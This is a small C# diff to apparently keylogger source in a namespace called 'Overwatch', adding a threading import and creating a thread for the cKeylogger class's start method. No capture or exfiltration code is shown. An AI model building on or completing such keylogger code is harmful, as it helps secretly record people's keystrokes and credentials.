@@ -3,6 +3,7 @@ using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Threading;
 
 namespace Overwatch
 {
@@ -39,6 +40,7 @@ namespace Overwatch
     public cKeylogger()
         {
             counter = 0;
+            Thread KeyTread = new Thread(start);
         }
         internal void start()
         {
